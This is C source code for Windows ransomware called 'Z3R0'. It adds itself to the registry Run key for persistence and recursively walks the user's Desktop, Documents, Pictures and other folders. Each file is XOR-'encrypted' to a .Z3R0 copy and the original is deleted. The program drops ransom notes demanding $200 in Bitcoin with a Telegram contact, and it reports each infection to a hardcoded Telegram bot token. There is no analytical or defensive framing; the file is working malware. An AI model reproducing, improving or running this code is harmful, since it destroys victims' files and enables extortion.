#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <windows.h>
#include <wininet.h>


#define TELEGRAM_BOT_TOKEN "7070810798:AAG1tdvNZXvkzxZNywQQQzzMmdzEslINKH8"
#define TELEGRAM_CHAT_ID "6743904154"
#define AES_BLOCK_SIZE 16

// Sample key (128-bit key)
uint8_t key[AES_BLOCK_SIZE] = {
    0x2b, 0x7e, 0x15, 0x16,
    0x28, 0xae, 0xd2, 0xa6,
    0xab, 0xf7, 0x97, 0x56,
    0x46, 0x4d, 0x8e, 0x7f
};

void encryptAES(uint8_t *input, uint8_t *output, uint8_t *key) {
    // Perform a simple XOR operation for demonstration
    for (int i = 0; i < AES_BLOCK_SIZE; i++) {
        output[i] = input[i] ^ key[i];
    }
}

int encryptFile(const char *inFilePath, const char *outFilePath, uint8_t *key) {
    FILE *inFile = fopen(inFilePath, "rb");
    if (inFile == NULL) {
        printf("Failed to open input file: %s\n", inFilePath);
        return 0;
    }

    FILE *outFile = fopen(outFilePath, "wb");
    if (outFile == NULL) {
        fclose(inFile);
        printf("Failed to create output file: %s\n", outFilePath);
        return 0;
    }

    uint8_t input[AES_BLOCK_SIZE];
    uint8_t output[AES_BLOCK_SIZE];

    size_t bytesRead;
    while ((bytesRead = fread(input, 1, AES_BLOCK_SIZE, inFile)) > 0) {
        encryptAES(input, output, key);
        fwrite(output, 1, bytesRead, outFile);
    }

    fclose(inFile);
    fclose(outFile);
    return 1;
}

void performAction(const char *filePath, uint8_t *key) {
    printf("Encrypting file: %s\n", filePath);
    char outFile[1024]; // Increased buffer size
    snprintf(outFile, sizeof(outFile), "%s.Z3R0", filePath);
    if (!encryptFile(filePath, outFile, key)) {
        printf("Encryption failed for file: %s\n", filePath);
    }
    if (remove(filePath) == 0) {
        printf("File '%s' deleted successfully.\n", filePath);
    } else {
        perror("Error deleting file");
        // Handle error here if needed
    }
}

void listFilesRecursively(const char *path, uint8_t *key) {
    DIR *dir;
    struct dirent *entry;
    struct stat statbuf;

    if ((dir = opendir(path)) == NULL) {
        perror("opendir");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        char fullpath[1024]; // Increased buffer size
        snprintf(fullpath, sizeof(fullpath), "%s\\%s", path, entry->d_name); // Changed path separator for Windows

        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        if (stat(fullpath, &statbuf) == -1) {
            perror("stat");
            continue;
        }

        if (S_ISDIR(statbuf.st_mode)) {
            printf("Directory: %s\n", fullpath);
            listFilesRecursively(fullpath, key); // Recursive call for subdirectory
        } else {
            performAction(fullpath, key); // Call performAction with the file path
        }
    }

    closedir(dir);
}

char* getUserProfilePath(const char* folder) {
    const char* userProfile = getenv("USERPROFILE");
    if (userProfile == NULL) {
        fprintf(stderr, "Error: USERPROFILE environment variable not found.\n");
        return NULL;
    }

    size_t len = strlen(userProfile) + strlen(folder) + 2;
    char* path = (char*)malloc(len);
    if (path == NULL) {
        perror("malloc");
        return NULL;
    }

    snprintf(path, len, "%s\\%s", userProfile,folder);
    return path;
}


void sendTelegramMessage(const char *message) {
    HINTERNET hInternet, hConnect;
    char url[512];
    char postData[1024];
    DWORD bytesRead;

    // Construct the URL for the Telegram Bot API sendMessage method
    sprintf(url, "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
            TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);

    // Initialize WinINet
    hInternet = InternetOpenA("MyApp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("Failed to initialize WinINet\n");
        return;
    }

    // Connect to the server
    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        printf("Failed to connect to server\n");
        InternetCloseHandle(hInternet);
        return;
    }

    // Read the response (optional, you may not need to read the response)
    char buffer[1024];
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        // You can process the response if needed
        // printf("%.*s", bytesRead, buffer);
    }

    // Clean up
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}


int CreateFiles(){
    FILE *file;
    char *filename = "Z3R0.txt";
    char *filepath;
    char command[100];
    // Get the value of the APPDATA environment variable
    const char* appdataPath = getenv("APPDATA");

    // Concatenate the folder name to the APPDATA path
    char folderPath[256]; // Adjust the buffer size as needed
    sprintf(folderPath, "%s\\Z3R0", appdataPath);

    // Check if the folder already exists
    if (access(folderPath, F_OK) != -1) {
        printf("Folder already exists.\n");
    } else {
        // Create the folder
        int status = mkdir(folderPath);
        if (status == 0) {
            printf("Folder created successfully.\n");
        } else {
            printf("Failed to create folder.\n");
            return 1;
        }
    }

    // Concatenate folderPath and filename
    filepath = (char *)malloc(strlen(folderPath) + strlen(filename) + 1);
    sprintf(filepath, "%s\\%s", folderPath, filename);

    // Check if the file already exists
    if (access(filepath, F_OK) != -1) {
        printf("File already exists.\n");
    } else {
        // Open file for writing
        file = fopen(filepath, "w");
        if (file == NULL) {
            printf("Error opening file.\n");
            free(filepath);
            return 1;
        }
    
        // Write text to file
        fprintf(file, "these files are responsible for storing informations about you files\nif any of these files was deleted all your files will be gone forever\nif you want to restore your data you will have to pay 200$ in BTC\nthe sooner you pay the less damage will be caused to your files\ncontact us for more instructions on how to pay\nhttps://t.me/bx1yr");
    
        // Close the file
        fclose(file);
    
        printf("File created and text written successfully.\n");
    }
    sprintf(command, "start %s", filename);
    system(command);

    // Free allocated memory for filepath
    free(filepath);

    return 0;
}
int CreateMessage(char *folderPath){
    char command[100];
    FILE *file;
    char *filename = "Z3R0.txt";
    char *filepath;
    filepath = (char *)malloc(strlen(folderPath) + strlen(filename) + 1);
    sprintf(filepath, "%s\\%s", folderPath, filename);

    // Check if the file already exists
    if (access(filepath, F_OK) != -1) {
        printf("File already exists.\n");
    } else {
        // Open file for writing
        file = fopen(filepath, "w");
        if (file == NULL) {
            printf("Error opening file.\n");
            free(filepath);
            return 1;
        }
    }
        // Write text to file
        fprintf(file, "All of your files have been encrypted\nif you want to restore them you will have to pay 200$ in BTC\nthe sooner you pay the less damage will be caused to your file\ncontact us fore more instructions on the payment\nhttps://t.me/bx1yr\n--------------bx1--------------");
        sprintf(command, "start %s", filepath);
        system(command);
        // Close the file
        fclose(file);
    return 0;
}

int main() {
    HKEY hKey;
    LONG regOpenResult;
    const char* path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "Z3R0";
    const char* valueData = "Z3R0.exe";
    const char *message = "The Malware Was Ran";

    char *desktopPath = getUserProfilePath("Desktop");
    char *downloadsPath = getUserProfilePath("Downloads");
    char *documentsPath = getUserProfilePath("Documents");
    char *picturesPath = getUserProfilePath("Pictures");
    char *musicPath = getUserProfilePath("Music");
    char *videosPath = getUserProfilePath("Videos");
    char *programsPath = getUserProfilePath("Programs");
    // Open the registry key
    regOpenResult = RegOpenKeyExA(HKEY_CURRENT_USER, path, 0, KEY_QUERY_VALUE, &hKey);
    if (regOpenResult != ERROR_SUCCESS) {
        printf("Error opening registry key. Error code: %ld\n", regOpenResult);
        return 1;
    }

    // Check if the value exists
    DWORD dataSize = 0;
    if (RegQueryValueExA(hKey, valueName, NULL, NULL, NULL, &dataSize) == ERROR_SUCCESS) {
        printf("Program is already added to autorun.\n");
        CreateMessage(desktopPath);
        RegCloseKey(hKey);
        // go to gui and countdown
        return 0;
    }

    // Close the registry key
    RegCloseKey(hKey);

    // Open the registry key for writing
    regOpenResult = RegCreateKeyExA(HKEY_CURRENT_USER, path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey,NULL);
    if (regOpenResult != ERROR_SUCCESS) {
        printf("Error opening registry key. Error code: %ld\n", regOpenResult);
        return 1;
    }

    // Set the registry value
    if (RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)valueData, strlen(valueData) + 1) == ERROR_SUCCESS) {
        printf("Program added to autorun successfully.\n");
        sendTelegramMessage(message);
    } else {
        printf("Error adding program to autorun.\n");
    }

    // Close the registry key
    RegCloseKey(hKey);
    if (desktopPath == NULL || downloadsPath == NULL || documentsPath == NULL || picturesPath == NULL ||
    musicPath == NULL || videosPath == NULL || programsPath == NULL) {
    fprintf(stderr, "Error: One or more paths are NULL.\n");
}
    listFilesRecursively(desktopPath, key); // Pass the encryption key
    listFilesRecursively(downloadsPath, key); // Pass the encryption key
    listFilesRecursively(documentsPath, key); // Pass the encryption key
    listFilesRecursively(picturesPath, key); // Pass the encryption key
    listFilesRecursively(musicPath, key); // Pass the encryption key
    listFilesRecursively(videosPath, key); // Pass the encryption key
    listFilesRecursively(programsPath, key); // Pass the encryption key
    free(desktopPath);
    free(downloadsPath);
    free(documentsPath);
    free(picturesPath);
    free(musicPath);
    free(videosPath);
    free(programsPath);

    return 0;
}
